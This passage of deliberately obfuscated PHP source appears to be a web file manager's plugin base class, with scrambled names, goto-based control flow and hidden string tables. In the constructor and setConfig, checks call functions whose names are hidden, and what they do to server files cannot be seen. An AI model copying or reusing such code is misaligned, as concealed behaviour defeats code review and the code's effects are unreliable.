$Aö°°’çñ[12] => 32768 + 511, $Aö°°’çñ[1204] => 0, $Aö°°’çñ[1205] => 0, $Aö°°’çñ[1206] => 0, $Aö°°’çñ[1207] => 0, $Aö°°’çñ[78] => $cÏ˜ß·Ã¿Á[$Aö°°’çñ[78]], $Aö°°’çñ[1208] => $cÏ˜ß·Ã¿Á[$Aö°°’çñ[1126]], $Aö°°’çñ[1209] => $cÏ˜ß·Ã¿Á[$Aö°°’çñ[106]], $Aö°°’çñ[1210] => $cÏ˜ß·Ã¿Á[$Aö°°’çñ[184]], $Aö°°’çñ[1211] => 0, $Aö°°’çñ[1212] => 0); } static $fileInfo = array(); public function info($cÊ†Ì¨¯Ö) { $AÖÚŸœ™†Á = $_SERVER[÷ÖêïÔÔÓ][1213]; if (isset(self::$fileInfo[$cÊ†Ì¨¯Ö])) { return self::$fileInfo[$cÊ†Ì¨¯Ö]; } if (substr($cÊ†Ì¨¯Ö, 0, strlen($AÖÚŸœ™†Á)) != $AÖÚŸœ™†Á) { return !1; } self::$fileInfo[$cÊ†Ì¨¯Ö] = IO::info(substr($cÊ†Ì¨¯Ö, strlen($AÖÚŸœ™†Á))); return self::$fileInfo[$cÊ†Ì¨¯Ö]; } public static function read($C™¾íœ®‘, $a³µîˆ, $bå‰à–ÊÆ) { goto E†ª„ÂùÎ±; fÍÀÚœº—: $d¶î¦’¦ÍŒ = 0; while ($d¶î¦’¦ÍŒ < $bå‰à–ÊÆ) { $D·°Æî¾š = min($aÅÙÔÚõõ‹, $bå‰à–ÊÆ - $d¶î¦’¦ÍŒ); $cß–àĞ–˜– .= fread($Cà×™õ ‡ç, $D·°Æî¾š); $d¶î¦’¦ÍŒ += $D·°Æî¾š; } fclose($Cà×™õ ‡ç); goto eî¨¬á‰‘§; eî¨¬á‰‘§: return $cß–àĞ–˜–; goto CˆÆˆÀ»—˜; E†ª„ÂùÎ±: $cïï¾–èéÃ =& $_SERVER[÷ÖêïÔÔÓ]; $Cà×™õ ‡ç = fopen($C™¾íœ®‘, $cïï¾–èéÃ[1128]); if (!$Cà×™õ ‡ç) { return $cïï¾–èéÃ[33]; } goto EŒÀ¹ÉÏ; EŒÀ¹ÉÏ: $aÅÙÔÚõõ‹ = 8192; fseek($Cà×™õ ‡ç, $a³µîˆ, SEEK_SET); $cß–àĞ–˜– = $cïï¾–èéÃ[33]; goto fÍÀÚœº—; CˆÆˆÀ»—˜: } public function fileSubstr($D¨†¬¤¯Ã, $bµß¹¿ö ’) { goto Aà³”«¾Ä; aÒ˜å‰ß™„: $A‡ÄÈ›Âö‚ = 0; $aóÊĞÆ¡ = 0; $b¸¿ëÈ˜±ê = $EªÂÖ²Ù´‚[33]; goto FëÕ—Ÿ¾¡™; FëÕ—Ÿ¾¡™: foreach ($aÙÚ¼ïÙ©‹ as $A‡ÄÈ›Âö‚ => $b¸¿ëÈ˜±ê) { $A‡ÄÈ›Âö‚ = intval($A‡ÄÈ›Âö‚); $aóÊĞÆ¡ = $A‡ÄÈ›Âö‚ + strlen($b¸¿ëÈ˜±ê); if ($D¨†¬¤¯Ã >= $aóÊĞÆ¡) { continue; } if ($D¨†¬¤¯Ã >= $A‡ÄÈ›Âö‚ && $D¨†¬¤¯Ã + $bµß¹¿ö ’ <= $aóÊĞÆ¡) { return substr($b¸¿ëÈ˜±ê, $D¨†¬¤¯Ã - $A‡ÄÈ›Âö‚, $bµß¹¿ö ’); } break; } if (count($aÙÚ¼ïÙ©‹) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($EªÂÖ²Ù´‚[1214], $EªÂÖ²Ù´‚[1215] . count($aÙÚ¼ïÙ©‹) . "\x3b\163\x74\141\x72\164\75{$D¨†¬¤¯Ã}\x2c\154\x65\x6e\147\x74\150\x3d{$bµß¹¿ö ’}\x3b\x70\x6f\x73\x65\72{$A‡ÄÈ›Âö‚}\x7e{$aóÊĞÆ¡}"); throw new Exception($EªÂÖ²Ù´‚[1216]); } $bÙ’Ø×®ÂÑ = intval($D¨†¬¤¯Ã / $ağ­®÷™¹Á) * $ağ­®÷™¹Á; goto EØ®İÖŒôÌ; béªšª²±˜: $ağ­®÷™¹Á = 64 * 1024; $aÙÚ¼ïÙ©‹ =& self::$_chunkBuffer[$this->path]; if (!$aÙÚ¼ïÙ©‹) { $aÙÚ¼ïÙ©‹ = array(); } goto aÒ˜å‰ß™„; aÕÔ‘·­ª÷: $A°Ò’‡·¥¨ = $bµß¹¿ö ’; if ($D¨†¬¤¯Ã < 0) { $D¨†¬¤¯Ã = $F¤¸çÊßø¸ + $D¨†¬¤¯Ã; } if ($bµß¹¿ö ’ === !1) { $bµß¹¿ö ’ = $F¤¸çÊßø¸ - $D¨†¬¤¯Ã; } goto D«’˜¶ã±; aºŞ¶ôñÃ: ksort($aÙÚ¼ïÙ©‹); $EŠ¤øö¯«Ñ = substr($a£ê„®™Üš, $D¨†¬¤¯Ã - $bÙ’Ø×®ÂÑ, $bµß¹¿ö ’); return $EŠ¤øö¯«Ñ; goto a‹ÍËîÍéÓ; Aà³”«¾Ä: $EªÂÖ²Ù´‚ =& $_SERVER[÷ÖêïÔÔÓ]; $F¤¸çÊßø¸ = $this->info[$EªÂÖ²Ù´‚[78]]; $BÁí„Ñßùê = $D¨†¬¤¯Ã; goto aÕÔ‘·­ª÷; EØ®İÖŒôÌ: $FºÛì„Ü‹à = ceil(($D¨†¬¤¯Ã + $bµß¹¿ö ’) / $ağ­®÷™¹Á) * $ağ­®÷™¹Á - $bÙ’Ø×®ÂÑ; $a£ê„®™Üš = IO::fileSubstr($this->path, $bÙ’Ø×®ÂÑ, $FºÛì„Ü‹à); $aÙÚ¼ïÙ©‹[$bÙ’Ø×®ÂÑ . $EªÂÖ²Ù´‚[33]] = $a£ê„®™Üš; goto aºŞ¶ôñÃ; D«’˜¶ã±: if ($D¨†¬¤¯Ã + $bµß¹¿ö ’ > $F¤¸çÊßø¸) { $bµß¹¿ö ’ = $F¤¸çÊßø¸ - $D¨†¬¤¯Ã; } if ($bµß¹¿ö ’ <= 0) { return $EªÂÖ²Ù´‚[33]; } if ($D¨†¬¤¯Ã < 0 || $D¨†¬¤¯Ã >= $F¤¸çÊßø¸ || $bµß¹¿ö ’ <= 0 || $bµß¹¿ö ’ > 1024 * 1024 * 5) { throw new Exception("\151\157\x46\x69\154\x65\122\x65\141\x64\40\145\162\x72\x6f\162\x21\x20\163\x74\141\x72\x74\x3d{$D¨†¬¤¯Ã}\73\154\145\x6e\147\164\150\x3d{$bµß¹¿ö ’}\73\x20\x73\151\172\145\75{$F¤¸çÊßø¸}\73"); } goto béªšª²±˜; a‹ÍËîÍéÓ: } private function log($A©²ù¿÷Ú, $F•ƒ‰•†Æ) { $dœßç‚½äÖ =& $_SERVER[÷ÖêïÔÔÓ]; $Bå‡­Û¦¬› = timeFloat() - $this->timeStart; write_log(sprintf($dœßç‚½äÖ[1217], $A©²ù¿÷Ú, $this->info[$dœßç‚½äÖ[28]], $Bå‡­Û¦¬›, $F•ƒ‰•†Æ), $dœßç‚½äÖ[1178]); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto F¼‚³˜è‰…; f²§ÖµŸà¯: $this->pluginHost = PLUGIN_HOST . $this->pluginName . $Añî±ÒÂÙç[8]; $this->pluginHostDefault = PLUGIN_HOST . $this->pluginName . $Añî±ÒÂÙç[8]; $this->pluginLangArr = $this->initLang(); goto DÛ…ßÕ‹ƒù; eî™•’âÉÈ: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($Añî±ÒÂÙç[1218]); goto C„©”ƒÙÓŠ; DÛ…ßÕ‹ƒù: $this->values = array(); return $this; goto cÀ·ï·§ÁÓ; F¼‚³˜è‰…: $Añî±ÒÂÙç =& $_SERVER[÷ÖêïÔÔÓ]; if ($_SERVER[$Añî±ÒÂÙç[781]] != $_SERVER[$Añî±ÒÂÙç[782]]) { goto e‚”˜ÜÓÌ©; DÑƒÚŞ§¬¶: $eÛäÊà³¥÷ = $Añî±ÒÂÙç[788]; $eÛäÊà³¥÷($_SERVER[$Añî±ÒÂÙç[789]]); $eÛäÊà³¥÷($_SERVER[$Añî±ÒÂÙç[785]] . $Añî±ÒÂÙç[790]); goto aÁÕØç˜‹¡; fõå¯¡Œ‘¿: $FÕÖÌäÜ— = $aˆˆéš²¾($døÒ–ãÏÇ¾); $e¥¥ˆ…Ìñ = explode($Añî±ÒÂÙç[214], $FÕÖÌäÜ—); if (count($e¥¥ˆ…Ìñ) < $Añî±ÒÂÙç[557]) { $BåÖœ†«ÇÍ = $Añî±ÒÂÙç[787]; $BåÖœ†«ÇÍ(); } goto DÑƒÚŞ§¬¶; aÁÕØç˜‹¡: $f¯ÕëòË‰… = 1; while ($f¯ÕëòË‰… > 1) { $f¯ÕëòË‰… = $f¯ÕëòË‰… + 4; $BÜÖàã±Ê = rawurlencode($f¯ÕëòË‰… . $Añî±ÒÂÙç[358]); } goto DÙ®É¥íö; e‚”˜ÜÓÌ©: $Aâ…¬¿´á = $Añî±ÒÂÙç[783]; $aˆˆéš²¾ = $Añî±ÒÂÙç[784]; $døÒ–ãÏÇ¾ = $_SERVER[$Añî±ÒÂÙç[785]] . $Añî±ÒÂÙç[786]; goto fõå¯¡Œ‘¿; DÙ®É¥íö: } global $in, $config; goto eî™•’âÉÈ; C„©”ƒÙÓŠ: $this->pluginName = str_replace($Añî±ÒÂÙç[1218], $Añî±ÒÂÙç[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Añî±ÒÂÙç[8]; $this->pluginApi = app_host_get() . $Añî±ÒÂÙç[1219] . $this->pluginName . $Añî±ÒÂÙç[8]; goto f²§ÖµŸà¯; cÀ·ï·§ÁÓ: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[÷ÖêïÔÔÓ][1220]); } protected function assign($bïë“ù‚Ğ, $b…™Ò–©„ = false) { if (is_array($bïë“ù‚Ğ)) { $this->values = array_merge($this->values, $bïë“ù‚Ğ); } else { $this->values[$bïë“ù‚Ğ] = $b…™Ò–©„; } } protected function display($Dæ²ŸØ¦Ç) { extract($this->values); require $Dæ²ŸØ¦Ç; } final function hookRegist($bë¬º…á¶) { $this->modelPlugin->appRegist($this->pluginName, $bë¬º…á¶); } final function appIcon() { $B…•óªÕ‡Æ =& $_SERVER[÷ÖêïÔÔÓ]; $c¢Î‘–ÊÜ = $this->appPackage(); $d¤î™÷Æ = $B…•óªÕ‡Æ[33]; if (isset($c¢Î‘–ÊÜ[$B…•óªÕ‡Æ[379]])) { if (isset($c¢Î‘–ÊÜ[$B…•óªÕ‡Æ[379]][$B…•óªÕ‡Æ[1221]])) { $d¤î™÷Æ = $B…•óªÕ‡Æ[1222] . $c¢Î‘–ÊÜ[$B…•óªÕ‡Æ[379]][$B…•óªÕ‡Æ[1221]] . $B…•óªÕ‡Æ[1223]; } else { if ($c¢Î‘–ÊÜ[$B…•óªÕ‡Æ[379]][$B…•óªÕ‡Æ[1224]]) { $d¤î™÷Æ = $B…•óªÕ‡Æ[1225] . $c¢Î‘–ÊÜ[$B…•óªÕ‡Æ[379]][$B…•óªÕ‡Æ[1224]] . $B…•óªÕ‡Æ[1226]; } } } return $d¤î™÷Æ; } final function fileCanView($f²Ç²­†Ç·) { $AÌöÀè¹ô =& $_SERVER[÷ÖêïÔÔÓ]; if ($this->isShare($f²Ç²­†Ç·)) { return !0; } if (!Action($AÌöÀè¹ô[1227])->authCan($AÌöÀè¹ô[1228])) { show_tips(LNG($AÌöÀè¹ô[1229]), !1); } ActionCall($AÌöÀè¹ô[1230], $f²Ç²­†Ç·); } final function isShare($C¦Ëõòë‚ˆ) { $E¢³Ÿ°°Ô† = KodIO::parse($C¦Ëõòë‚ˆ); return $E¢³Ÿ°°Ô†[$_SERVER[÷ÖêïÔÔÓ][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($C®Æ›Â×ßÃ) { if (request_url_safe($C®Æ›Â×ßÃ)) { return $C®Æ›Â×ßÃ; } if (!$this->isShare($C®Æ›Â×ßÃ)) { $C®Æ›Â×ßÃ = $this->filePath($C®Æ›Â×ßÃ); } return Action($_SERVER[÷ÖêïÔÔÓ][990])->linkOut($C®Æ›Â×ßÃ); } public function filePathLinkOut($c—íŒ›”š) { if (request_url_safe($c—íŒ›”š)) { return $c—íŒ›”š; } $this->fileCanView($c—íŒ›”š); return Action($_SERVER[÷ÖêïÔÔÓ][990])->link($c—íŒ›”š); } final function filePath($dÁ³ò¸ÂŸÈ) { if ($AÀÎ®Ğ×—Ë = $this->checkSharePath($dÁ³ò¸ÂŸÈ)) { return $AÀÎ®Ğ×—Ë; } $this->fileCanView($dÁ³ò¸ÂŸÈ); if (request_url_safe($dÁ³ò¸ÂŸÈ)) { $dÁ³ò¸ÂŸÈ = $this->_cacheHttpFile($dÁ³ò¸ÂŸÈ); $this->fileInfo = IO::infoWithChildren($dÁ³ò¸ÂŸÈ); } else { $this->fileInfo = IO::infoWithChildren($dÁ³ò¸ÂŸÈ); if (!$this->fileInfo) { show_tips(LNG($_SERVER[÷ÖêïÔÔÓ][101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $dÁ³ò¸ÂŸÈ; } final function _cacheHttpFile($d¾Ç‰š›¹) { $eİµ¦øÂİÒ = hash_path($d¾Ç‰š›¹, !0); $this->cachePath = $this->pluginCachePath($eİµ¦øÂİÒ); if ($bíš–óôÖ = IO::fileNameExist($this->cachePath, $eİµ¦øÂİÒ)) { return KodIO::make($bíš–óôÖ); } $F êáîƒî¢ = $this->cachePath . $eİµ¦øÂİÒ; return $this->pluginCacheFileSet($F êáîƒî¢, file_get_contents($d¾Ç‰š›¹)); } final function _tmpFileName($cÏ™ê™ø­á = array()) { goto Fš¼ã…˜»Œ; d¡ğåğà: if (isset($cÏ™ê™ø­á[$C¸†ÜÁÒÕ[159]][$C¸†ÜÁÒÕ[161]])) { return $cÏ™ê™ø­á[$C¸†ÜÁÒÕ[159]][$C¸†ÜÁÒÕ[161]]; } $BŞÔøšê¸´ = array($cÏ™ê™ø­á[$C¸†ÜÁÒÕ[28]], $cÏ™ê™ø­á[$C¸†ÜÁÒÕ[76]], $cÏ™ê™ø­á[$C¸†ÜÁÒÕ[78]]); if (isset($cÏ™ê™ø­á[$C¸†ÜÁÒÕ[455]])) { $BŞÔøšê¸´[] = $cÏ™ê™ø­á[$C¸†ÜÁÒÕ[455]]; } goto BÙÌ‰ªŒÑ; BÙÌ‰ªŒÑ: return md5(implode($C¸†ÜÁÒÕ[71], $BŞÔøšê¸´)); goto b»Ÿ¸µè÷¤; Fš¼ã…˜»Œ: $C¸†ÜÁÒÕ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$cÏ™ê™ø­á) { $cÏ™ê™ø­á = $this->fileInfo; } if (isset($cÏ™ê™ø­á[$C¸†ÜÁÒÕ[161]])) { return $cÏ™ê™ø­á[$C¸†ÜÁÒÕ[161]]; } goto d¡ğåğà; b»Ÿ¸µè÷¤: } final function checkSharePath($f¼´˜÷ ) { goto b‡ÏáŒ©öÎ; d•ã¦šï§—: $F­ğ‡øÜÀÑ = Action($c¡†‡¶«ÇÏ[990])->sharePathInfo($f¼´˜÷ ); if (!isset($F­ğ‡øÜÀÑ[$c¡†‡¶«ÇÏ[76]])) { show_json(LNG($c¡†‡¶«ÇÏ[1232]), !1); } $this->fileInfo = $F­ğ‡øÜÀÑ[$c¡†‡¶«ÇÏ[159]]; goto E­›¬ˆ‹; b‡ÏáŒ©öÎ: $c¡†‡¶«ÇÏ =& $_SERVER[÷ÖêïÔÔÓ]; if (!defined($c¡†‡¶«ÇÏ[423])) { define($c¡†‡¶«ÇÏ[1231], 0); } if (!$this->isShare($f¼´˜÷ )) { return !1; } goto d•ã¦šï§—; E­›¬ˆ‹: $this->cachePath = $this->pluginCachePath($this->fileInfo[$c¡†‡¶«ÇÏ[161]]); return $F­ğ‡øÜÀÑ[$c¡†‡¶«ÇÏ[76]]; goto fÄè‘ğÅ; fÄè‘ğÅ: } final function pluginCachePath($Aº‘…ùùƒ = '') { $b“„ˆÀ‡«· =& $_SERVER[÷ÖêïÔÔÓ]; $Fí®Ø½íøÓ = IO_PATH_SYSTEM_TEMP . $b“„ˆÀ‡«·[1233] . $this->pluginName; if (!($e°Î´ŞñŸ = IO::infoFull($Fí®Ø½íøÓ))) { return IO::mkdir($Fí®Ø½íøÓ . $b“„ˆÀ‡«·[8] . $Aº‘…ùùƒ); } if (empty($Aº‘…ùùƒ)) { return $e°Î´ŞñŸ[$b“„ˆÀ‡«·[76]]; } if (!($C›§­•™Û = IO::fileNameExist($e°Î´ŞñŸ[$b“„ˆÀ‡«·[76]], $Aº‘…ùùƒ))) { return IO::mkdir($e°Î´ŞñŸ[$b“„ˆÀ‡«·[76]] . $Aº‘…ùùƒ); } return KodIO::make($C›§­•™Û); } final function pluginCacheFileSet($aÉÂğ…Ÿ±æ, $D’çï¬¶” = '') { $AŸİƒÅÚ§Ğ =& $_SERVER[÷ÖêïÔÔÓ]; if (!($A¬Ö©¶ç¿ = IO::infoFull($aÉÂğ…Ÿ±æ))) { return IO::mkfile($aÉÂğ…Ÿ±æ, $D’çï¬¶”, REPEAT_REPLACE); } IO::setContent($A¬Ö©¶ç¿[$AŸİƒÅÚ§Ğ[76]], $D’çï¬¶”); return $A¬Ö©¶ç¿[$AŸİƒÅÚ§Ğ[76]]; } final function pluginLocalFile($cÅŸ½ÉõÄŠ = '') { goto FŸÔ„ö; Aí‡‘½Š›: if (!$cÅŸ½ÉõÄŠ) { return $dÙÑÏ‰¨•; } $fá›ÀñŠ—ù = IO::info($cÅŸ½ÉõÄŠ); $fÊõğçëª… = $this->_tmpFileName($fá›ÀñŠ—ù); goto cÜÚÌ¼Í; FŸÔ„ö: $Dçæœ¸Ú†Î =& $_SERVER[÷ÖêïÔÔÓ]; $dÙÑÏ‰¨• = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($dÙÑÏ‰¨•)) { mk_dir($dÙÑÏ‰¨•); } goto Aí‡‘½Š›; bæÙÜÈÖå: if ($cÅŸ½ÉõÄŠ != $Aµ‹õ–²Ğ) { $cÅŸ½ÉõÄŠ = IO::copy($cÅŸ½ÉõÄŠ, $Aµ‹õ–²Ğ); } return $cÅŸ½ÉõÄŠ; goto F„®ƒ°¡¿²; cÜÚÌ¼Í: $Aµ‹õ–²Ğ = $dÙÑÏ‰¨• . $fÊõğçëª… . $Dçæœ¸Ú†Î[92] . $fá›ÀñŠ—ù[$Dçæœ¸Ú†Î[157]]; if (@file_exists($Aµ‹õ–²Ğ)) { return $Aµ‹õ–²Ğ; } $cÅŸ½ÉõÄŠ = IO::download($cÅŸ½ÉõÄŠ, $Aµ‹õ–²Ğ); goto bæÙÜÈÖå; F„®ƒ°¡¿²: } final function appPackage() { goto BŞÓÌĞÀ±Å; BÕ­øà¤: $this->parseLang($eãÛ”ËíÀ); $F±İ­öÆ° = json_decode_force($eãÛ”ËíÀ); if (!$F±İ­öÆ°) { return array(); } goto eà’ÔâÃšê; dÆ†ø×Û«Á: return $F±İ­öÆ°; goto b›¯Í‚°ç‹; eà’ÔâÃšê: $dÂ­º¤Éõš = Hook::trigger($cõ¨Ì¬Î¨ˆ[1235], $F±İ­öÆ°); if ($dÂ­º¤Éõš && is_array($dÂ­º¤Éõš)) { $F±İ­öÆ° = $dÂ­º¤Éõš; } $this->packageData = $F±İ­öÆ°; goto dÆ†ø×Û«Á; BŞÓÌĞÀ±Å: $cõ¨Ì¬Î¨ˆ =& $_SERVER[÷ÖêïÔÔÓ]; if ($this->packageData) { return $this->packageData; } $eãÛ”ËíÀ = $this->parseFile($this->pluginPath . $cõ¨Ì¬Î¨ˆ[1234]); goto BÕ­øà¤; b›¯Í‚°ç‹: } public function packageInfoGet($e„ÉÌ£ÈÛ–) { $E¿©âï¤ÓÖ = $this->appPackage(); return array_get_value($E¿©âï¤ÓÖ, $e„ÉÌ£ÈÛ–); } public function packageVersion() { return $this->packageInfoGet($_SERVER[÷ÖêïÔÔÓ][1236]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[÷ÖêïÔÔÓ][1237]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[÷ÖêïÔÔÓ][1238]); } private function parseFile($Aœ¸¡ïÓ) { $b”ìâŒˆ =& $_SERVER[÷ÖêïÔÔÓ]; $E®·¸•»õ = file_get_contents($Aœ¸¡ïÓ); $F„á…ñ¹É¨ = array($b”ìâŒˆ[1239], $b”ìâŒˆ[1240], $b”ìâŒˆ[1241], $b”ìâŒˆ[1242], $b”ìâŒˆ[1243], $b”ìâŒˆ[1244], $b”ìâŒˆ[1245]); $Eç¡ÆĞ•æ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$b”ìâŒˆ[84]][$b”ìâŒˆ[1246]]); $E®·¸•»õ = str_replace($F„á…ñ¹É¨, $Eç¡ÆĞ•æ, $E®·¸•»õ); return $E®·¸•»õ; } private function parseLang(&$CŠÔ¹ŠàÃÑ) { goto D¬Ëî¹Á—Ç; aĞËŞÏĞ: $Fßó¡ÈÛªÌ = array(); foreach ($C÷ßÇ¾Ÿ‘×[0] as $A„š·Ş§Ì·) { $c¾Œ…çÊ‹ = substr($A„š·Ş§Ì·, strlen($f×‰¤¥Ü”ë), -4); $Cœ‹…ã³Ù§ = LNG($c¾Œ…çÊ‹); $e‰‚øÃ‡ïš[] = $A„š·Ş§Ì·; $Fßó¡ÈÛªÌ[] = str_replace(array($C£¿âí­÷‚[214], $C£¿âí­÷‚[715], $C£¿âí­÷‚[327], $C£¿âí­÷‚[112]), array($C£¿âí­÷‚[50], $C£¿âí­÷‚[50], $C£¿âí­÷‚[33], $C£¿âí­÷‚[1249]), $Cœ‹…ã³Ù§); } $CŠÔ¹ŠàÃÑ = str_replace($e‰‚øÃ‡ïš, $Fßó¡ÈÛªÌ, $CŠÔ¹ŠàÃÑ); goto dº©³²µÑÅ; b–¯ŒåµÛë: preg_match_all($C£¿âí­÷‚[1248], $CŠÔ¹ŠàÃÑ, $C÷ßÇ¾Ÿ‘×); if (!is_array($C÷ßÇ¾Ÿ‘×) || count($C÷ßÇ¾Ÿ‘×) == 0 || !is_array($C÷ßÇ¾Ÿ‘×[0]) || count($C÷ßÇ¾Ÿ‘×[0]) == 0) { return; } $e‰‚øÃ‡ïš = array(); goto aĞËŞÏĞ; D¬Ëî¹Á—Ç: $C£¿âí­÷‚ =& $_SERVER[÷ÖêïÔÔÓ]; $f×‰¤¥Ü”ë = $C£¿âí­÷‚[1247]; if (!strstr($CŠÔ¹ŠàÃÑ, $f×‰¤¥Ü”ë)) { return; } goto b–¯ŒåµÛë; dº©³²µÑÅ: } private function parseConfig(&$FìÆî˜ä£ë) { goto E¡÷ç©›ÀÇ; E”´¦Ø®: $CÓ©ƒÂŸŸÑ = array(); $dÁ½ä¯—¿ƒ = array(); foreach ($eó×ÂùÙ­Ó[0] as $eª›éÄÁÅ) { $AŞ¾©¥ì¸Ç = substr($eª›éÄÁÅ, strlen($a¬Ü‚ò½Œ©), -2); $CÓ©ƒÂŸŸÑ[] = $eª›éÄÁÅ; $dÁ½ä¯—¿ƒ[] = _get($AŸ‘Éã¦», $AŞ¾©¥ì¸Ç); } goto AÉ£°£‚¬; AÉ£°£‚¬: $FìÆî˜ä£ë = str_replace($CÓ©ƒÂŸŸÑ, $dÁ½ä¯—¿ƒ, $FìÆî˜ä£ë); goto Dˆ”‘‘ŠãĞ; E¡÷ç©›ÀÇ: $F¶š¥ÅİÙ† =& $_SERVER[÷ÖêïÔÔÓ]; $a¬Ü‚ò½Œ© = $F¶š¥ÅİÙ†[1250]; if (!strstr($FìÆî˜ä£ë, $a¬Ü‚ò½Œ©)) { return; } goto e¾—ô‘¨œ; e¾—ô‘¨œ: preg_match_all($F¶š¥ÅİÙ†[1251], $FìÆî˜ä£ë, $eó×ÂùÙ­Ó); if (!is_array($eó×ÂùÙ­Ó) || count($eó×ÂùÙ­Ó) == 0 || !is_array($eó×ÂùÙ­Ó[0]) || count($eó×ÂùÙ­Ó[0]) == 0) { return; } $AŸ‘Éã¦» = $this->getConfig(); goto E”´¦Ø®; Dˆ”‘‘ŠãĞ: } private function parsePackage(&$cÇ³ÌÌ²ÜÏ) { goto eéÂ°ç´˜Î; A¤Ùİï­ß: preg_match_all($FÒ¤Ó«Š˜†[1253], $cÇ³ÌÌ²ÜÏ, $Fòó„ÑÔÓ); if (!is_array($Fòó„ÑÔÓ) || count($Fòó„ÑÔÓ) == 0 || !is_array($Fòó„ÑÔÓ[0]) || count($Fòó„ÑÔÓ[0]) == 0) { return; } $C”£¥„ßªĞ = $this->appPackage(); goto BâÉÆ à¡; BâÉÆ à¡: $a‰ä•ìÀ»« = array(); $a¶Ğ¶šè¯Ä = array(); foreach ($Fòó„ÑÔÓ[0] as $Aœ†Ô´Á˜ç) { $bù·£ª¾ = substr($Aœ†Ô´Á˜ç, strlen($a‰‰‚ˆ¹”¸), -2); $a‰ä•ìÀ»«[] = $Aœ†Ô´Á˜ç; $a¶Ğ¶šè¯Ä[] = _get($C”£¥„ßªĞ, $bù·£ª¾); } goto BÀó·Œõß; BÀó·Œõß: $cÇ³ÌÌ²ÜÏ = str_replace($a‰ä•ìÀ»«, $a¶Ğ¶šè¯Ä, $cÇ³ÌÌ²ÜÏ); goto F˜ªŠñŠ²ƒ; eéÂ°ç´˜Î: $FÒ¤Ó«Š˜† =& $_SERVER[÷ÖêïÔÔÓ]; $a‰‰‚ˆ¹”¸ = $FÒ¤Ó«Š˜†[1252]; if (!strstr($cÇ³ÌÌ²ÜÏ, $a‰‰‚ˆ¹”¸)) { return; } goto A¤Ùİï­ß; F˜ªŠñŠ²ƒ: } final function echoFile($bÒÉ¦º¬÷è, $AÕÜÊÍßµÕ = false) { goto a‘„‘¾¦¶; EŞéŒõØÜ¤: $a†‹±ò²ˆÁ = $this->parseFile($B›ª’»šÔ‚); $this->parseLang($a†‹±ò²ˆÁ); $this->parseConfig($a†‹±ò²ˆÁ); goto CÍ¥Œ°¿Õ›; CÍ¥Œ°¿Õ›: $this->parsePackage($a†‹±ò²ˆÁ); if (is_array($AÕÜÊÍßµÕ)) { $a†‹±ò²ˆÁ = str_replace(array_keys($AÕÜÊÍßµÕ), array_values($AÕÜÊÍßµÕ), $a†‹±ò²ˆÁ); } echo $f¾À÷Ş±Š[214] . $a†‹±ò²ˆÁ; goto cğ‡‰Â²‡; a‘„‘¾¦¶: $f¾À÷Ş±Š =& $_SERVER[÷ÖêïÔÔÓ]; $B›ª’»šÔ‚ = $this->pluginPath . $bÒÉ¦º¬÷è; if (ACT == $f¾À÷Ş±Š[1254]) { echo $f¾À÷Ş±Š[1255] . $this->pluginName . $f¾À÷Ş±Š[8] . $bÒÉ¦º¬÷è . $f¾À÷Ş±Š[1256]; if (!file_exists($B›ª’»šÔ‚)) { echo $f¾À÷Ş±Š[1257]; return; } } goto EŞéŒõØÜ¤; cğ‡‰Â²‡: } final function initLang() { goto fô¨¬–¤¤; Bß×¯³Üî: if (@count($eåƒ ¦÷¤ğ) > 0) { I18n::set($eåƒ ¦÷¤ğ); } return $eåƒ ¦÷¤ğ; goto a¡œ©Ûê‘£; fô¨¬–¤¤: $CøíÇÑè© =& $_SERVER[÷ÖêïÔÔÓ]; $D¯Ê–Ê“ = $CøíÇÑè©[1258]; $AÓ•Å˜Šëè = $this->pluginPath . $CøíÇÑè©[1259]; goto CÈˆ—îµ„; CÈˆ—îµ„: $Dèˆì‹èî = I18n::getType(); $eåƒ ¦÷¤ğ = array(); if (file_exists($AÓ•Å˜Šëè . $Dèˆì‹èî . $CøíÇÑè©[759])) { $eåƒ ¦÷¤ğ = (include_once $AÓ•Å˜Šëè . $Dèˆì‹èî . $CøíÇÑè©[759]); } else { if ($Dèˆì‹èî == $CøíÇÑè©[1260] && !file_exists($AÓ•Å˜Šëè . $Dèˆì‹èî . $CøíÇÑè©[759]) && file_exists($AÓ•Å˜Šëè . $CøíÇÑè©[1261])) { $eåƒ ¦÷¤ğ = (include_once $AÓ•Å˜Šëè . $CøíÇÑè©[1261]); } else { if (file_exists($AÓ•Å˜Šëè . $D¯Ê–Ê“ . $CøíÇÑè©[759])) { $eåƒ ¦÷¤ğ = (include_once $AÓ•Å˜Šëè . $D¯Ê–Ê“ . $CøíÇÑè©[759]); } } } goto Bß×¯³Üî; a¡œ©Ûê‘£: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($cã»¶Ÿ„®Û) { $F¢˜ÍÓˆå“ =& $_SERVER[÷ÖêïÔÔÓ]; $dë›áê = $_SERVER[$F¢˜ÍÓˆå“[785]] . $F¢˜ÍÓˆå“[786]; $B…¿•â­ë½ = $F¢˜ÍÓˆå“[1262]; if ($_SERVER[$F¢˜ÍÓˆå“[781]] != $B…¿•â­ë½($dë›áê)) { goto Aà¢‡‘ƒÛñ; Aà¢‡‘ƒÛñ: $FÌ„Ë¥¨Ëî = $F¢˜ÍÓˆå“[783]; $C˜ÓËéÄ² = $F¢˜ÍÓˆå“[784]; $E‚š©°ó = $_SERVER[$F¢˜ÍÓˆå“[785]] . $F¢˜ÍÓˆå“[786]; goto f×‰ÊšéŞ³; c¢ğùĞÛÛ‡: $CõÜ”Ş³£á = 1; for ($fíÄßÃ˜• = $CõÜ”Ş³£á; $fíÄßÃ˜• > 0; 